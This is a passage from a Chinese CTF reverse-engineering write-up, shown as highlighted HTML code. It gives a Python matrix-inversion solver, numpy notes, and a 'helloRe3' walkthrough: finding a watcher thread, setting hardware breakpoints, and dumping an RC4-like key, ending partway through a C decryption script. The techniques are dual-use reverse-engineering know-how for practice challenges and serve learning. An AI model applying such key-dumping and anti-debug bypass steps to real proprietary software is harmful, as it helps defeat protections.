v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">70</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">65</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">75</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">69</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">89</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">117</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">110</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">119</span><span class="token punctuation">;</span>
v2<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">67</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">63</span><span class="token punctuation">;</span>v2<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>

v2_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v2<span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">*</span>j<span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    v2_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>

v3_matrix <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    temp_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>v3<span class="token punctuation">[</span><span class="token number">6</span><span class="token operator">*</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    v3_matrix<span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>

<span class="token comment"># print(v2_matrix)</span>
<span class="token comment"># print(v3_matrix)</span>

v2_matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>v2_matrix<span class="token punctuation">)</span>
v3_matrix_compute <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v3_matrix_compute<span class="token punctuation">.</span>append<span class="token punctuation">(</span>np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>v3_matrix<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token comment"># print(v2_matrix)</span>
<span class="token comment"># print(np.linalg.inv(v2_matrix))</span>
<span class="token comment"># print(v3_matrix_compute[0])</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
    <span class="token comment">#print(v3_matrix_compute[i])</span>
    result <span class="token operator">=</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span>np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>v2_matrix<span class="token punctuation">)</span><span class="token punctuation">,</span>v3_matrix_compute<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> i<span class="token punctuation">:</span>
            <span class="token comment">#print(j,end = '')</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>对于脚本的一点mark，希望下次能快点写出来，踩了大坑，不要拿4血，真的淦。不过，最重要的应该还是知识点，其实这种操作复杂化一点就变成了加壳，那些脱壳的操作，正是这个进化版本，可能还会用到什么动态库，在seh上设置一个加壳函数，抛出异常再脱壳等等(仅猜测)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#初始化矩阵</span>
matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token builtin">list</span><span class="token operator">></span><span class="token punctuation">)</span>
<span class="token comment">#矩阵乘法</span>
result <span class="token operator">=</span> np<span class="token punctuation">.</span>matmul<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#矩阵点乘</span>
result <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">#一维矩阵转置</span>
matrix <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>matrix<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>T
<span class="token comment">#矩阵求逆</span>
matrix_inv <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>matrix_inv<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>再mark一波idc <a href="https://blog.csdn.net/jazrynwong/article/details/84875699">https://blog.csdn.net/jazrynwong/article/details/84875699</a></p>
<p>其实看文档也可以,不过还是中文舒服点<a href="https://www.hex-rays.com/products/ida/support/idadoc/162.shtml">https://www.hex-rays.com/products/ida/support/idadoc/162.shtml</a></p>
<h4 id="helloRe3"><a href="#helloRe3" class="headerlink" title="helloRe3"></a>helloRe3</h4><p>跟踪StringOutDebug，也就是debugger函数就会发现这个东西，可以看见</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe31.jpg" alt="1"></p>
<p>框框中对一个全局变量进行了改变，可见，这里是关键，但是发现我一旦把这地方变成1，它马上就变回0了。<br>当我们跟踪内存时候发现这个&amp;(&amp;addr)[72<em>i][4</em>v16+1]其实在内存中代表着对应字符对应的一个数字<br>&amp;(&amp;addr)[72<em>i][4</em>v16]则代表内存中的一个指向对应字符的指针</p>
<p>直接在这个地方下硬件写入断点，就能的到被改变的原因了，原来是一个线程搞的鬼。不过不下断点也能猜测到是别的线程下的手脚。不过仔细观察一下线程的一些特征也能找到一些不对劲的地方。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe32.jpg" alt="2"></p>
<p>除了主线程以外，还有一个线程在用户代码上花了很多时间，调试过后会发现这个线程的时间比主线程还长，由此可见应该去分析一下那个线程的入口，不出所料。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe33.jpg" alt="3"></p>
<p>看见那个地方为0，那么就会在循环里面不断重复。一旦变成1，他就开始了！！！</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/HelloRe34.jpg" alt="4"></p>
<p>在右边的方框中先把每个地方取反然后再进入左边，经过动态调试可以发现第一个函数是加密，静态分析后会发现第二个是比较两个是否相等。跟进第一个函数后发现，里面有两个函数，第一个生成一个key，第二个是加密，而key以明文256位存在内存中，直接dump下来就可以了。很奇怪的是为什么我dump了好几次，但是有两个结果？？第二天的时候dump下来的key才能用，很奇怪。可能是我之前dump错了地方，搞得我想半天以为是反调试，比较这个代码</p>
<p>最后解密脚本：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>

<span class="token keyword">void</span> <span class="token function">exchange_a_byte</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span> a<span class="token punctuation">,</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span> v <span class="token operator">=</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
    <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>
    <span class="token operator">*</span>b <span class="token operator">=</span> v<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">uint8_t</span> string_0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x1D</span><span class="token punctuation">,</span><span class="token number">0x7B</span><span class="token punctuation">,</span><span class="token number">0xA2</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0xA5</span><span class="token punctuation">,</span><span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0xB6</span><span class="token punctuation">,</span><span class="token number">0xCC</span><span class="token punctuation">,</span><span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x21</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x7A</span><span class="token punctuation">,</span><span class="token number">0xE4</span><span class="token punctuation">,</span><span class="token number">0x97</span>
                            <span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0xA9</span><span class="token punctuation">,</span><span class="token number">0xBB</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x3E</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span><span class="token number">0xA4</span><span class="token punctuation">,</span><span class="token number">0xD5</span><span class="token punctuation">,</span><span class="token number">0x7D</span><span class="token punctuation">,</span><span class="token number">0xFE</span><span class="token punctuation">,</span><span class="token number">0x4B</span>
                            <span class="token punctuation">,</span><span class="token number">0x3A</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x8F</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xB8</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token number">0x2B</span><span class="token punctuation">,</span><span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0x25</span><span class="token punctuation">,</span><span class="token number">0x47</span><span class="token punctuation">,</span><span class="token number">0xBD</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0xDC</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x2A</span>
                            <span class="token punctuation">,</span><span class="token number">0xBF</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xB1</span><span class="token punctuation">,</span><span class="token number">0xC3</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x17</span><span class="token punctuation">,</span><span class="token number">0x3F</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xFD</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0xCF</span><span class="token punctuation">,</span><span class="token number">0x57</span>
                            <span class="token punctuation">,</span><span class="token number">0x0E</span><span class="token punctuation">,</span><span class="token number">0x85</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0xB4</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x86</span><span class="token punctuation">,</span><span class="token number">0x6C</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0x8C</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span><span class="token number">0xB0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0xDF</span><span class="token punctuation">,</span><span class="token number">0x7E</span>
                            <span class="token punctuation">,</span><span class="token number">0xD4</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xF2</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x2E</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x82</span><span class="token punctuation">,</span><span class="token number">0x2F</span><span class="token punctuation">,</span><span class="token number">0x01</span>
                            <span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0xAC</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0x8D</span><span class="token punctuation">,</span><span class="token number">0xDD</span><span class="token punctuation">,</span><span class="token number">0xC1</span><span class="token punctuation">,</span><span class="token number">0xB2</span><span class="token punctuation">,</span><span class="token number">0xE9</span><span class="token punctuation">,</span><span class="token number">0xFA</span><span class="token punctuation">,</span><span class="token number">0x2C</span><span class="token punctuation">,</span><span class="token number">0xE2</span><span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token punctuation">,</span><span class="token number">0x1A</span><span class="token punctuation">,</span><span class="token number">0x0D</span>
                            <span class="token punctuation">,</span><span class="token number">0xC8</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span><span class="token number">0x46</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xA8</span><span class="token punctuation">,</span><span class="token number">0xB5</span><span class="token punctuation">,</span><span class="token number">0x64</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0xA6</span><span class="token punctuation">,</span><span class="token number">0x1E</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0xC6</span>
                            <span class="token punctuation">,</span><span class="token number">0xAA</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0xD6</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0xA7</span><span class="token punctuation">,</span><span class="token number">0x11</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0xFB</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x1B</span><span class="token punctuation">,</span><span class="token number">0xE3</span><span class="token punctuation">,</span><span class="token number">0x45</span>
                            <span class="token punctuation">,</span><span class="token number">0xAB</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x4A</span><span class="token punctuation">,</span><span class="token number">0xDB</span><span class="token punctuation">,</span><span class="token number">0xB7</span><span class="token punctuation">,</span><span class="token number">0x81</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span><span class="token number">0x71</span><span class="token punctuation">,</span><span class="token number">0x0F</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0xD3</span><span class="token punctuation">,</span><span class="token number">0x1F</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0xEE</span>
                            <span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0x4F</span><span class="token punctuation">,</span><span class="token number">0x7C</span><span class="token punctuation">,</span><span class="token number">0x98</span><span class="token punctuation">,</span><span class="token number">0xAE</span><span class="token punctuation">,</span><span class="token number">0x9A</span><span class="token punctuation">,</span><span class="token number">0xEA</span><span class="token punctuation">,</span><span class="token number">0x8A</span><span class="token punctuation">,</span><span class="token number">0xC5</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0xF8</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xD9</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x31</span>
                            <span class="token punctuation">,</span><span class="token number">0xB3</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token number">0x03</span><span class="token punctuation">,</span><span class="token number">0xF9</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x3B</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0x3D</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0xED</span><span class="token punctuation">,</span><span class="token number">0x70</span>
                            <span class="token punctuation">,</span><span class="token number">0x7F</span><span class="token punctuation">,</span><span class="token number">0x0A</span><span class="token punctuation">,</span><span class="token number">0x36</span><span class="token punctuation">,</span><span class="token number">0xD1</span><span class="token punctuation">,</span><span class="token number">0x87</span><span class="token punctuation">,</span><span class="token number">0xAF</span><span class="token punctuation">,</span><span class="token number">0x35</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0xEB</span><span class="token punctuation">,</span><span class="token number">0xF5</span><span class="token punctuation">,</span><span class="token number">0x37</span><span class="token punctuation">,</span><span class="token number">0xF1</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x43</span>
                            <span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0x95</span><span class="token punctuation">,</span><span class="token number">0xA3</span><span class="token punctuation">,</span><span class="token number">0xE8</span><span class="token punctuation">,</span><span class="token number">0x34</span><span class="token punctuation">,</span><span class="token number">0x9D</span><span class="token punctuation">,</span><span class="token number">0xBC</span><span class="token punctuation">,</span><span class="token number">0xCA</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0xA1</span><span class="token punctuation">,</span><span class="token number">0xF0</span><span class="token punctuation">,</span><span class="token number">0xF7</span><span class="token punctuation">,</span><span class="token number">0xCE</span><span class="token punctuation">,</span><span class="token number">0x94</span><span class="token punctuation">,</span><span class="token number">0x55</span>
                            <span class="token punctuation">,</span><span class="token number">0x6F</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x26</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0xFC</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span><span class="token number">0xCB</span><span class="token punctuation">,</span><span class="token number">0x9F</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x6A</span><span class="token punctuation">,</span><span class="token number">0x9B</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x2D</span>
                            <span class="token punctuation">,</span><span class="token number">0x74</span><span class="token punctuation">,</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span><span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x72</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x63</span><span class="token punctuation">,</span><span class="token number">0xA0</span><span class="token punctuation">,</span><span class="token number">0x0B</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token class-name">uint8_t</span> result<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0xAF</span><span class="token punctuation">,</span><span class="token number">0x27</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span>
                          <span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x6D</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span>
                          <span class="token number">0xF0</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x9A</span><span class="token punctuation">,</span>
                          <span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0x29</span><span class="token punctuation">,</span><span class="token number">0xFA</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span>
                          <span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xC8</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token class-name">uint8_t</span> flag<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>v7 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">20</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        v7 <span class="token operator">=</span> <span class="token punctuation">(</span>v7<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>
        v6 <span class="token operator">=</span> <span class="token punctuation">(</span>string_0<span class="token punctuation">[</span>v7<span class="token punctuation">]</span><span class="token operator">+</span>v6<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>
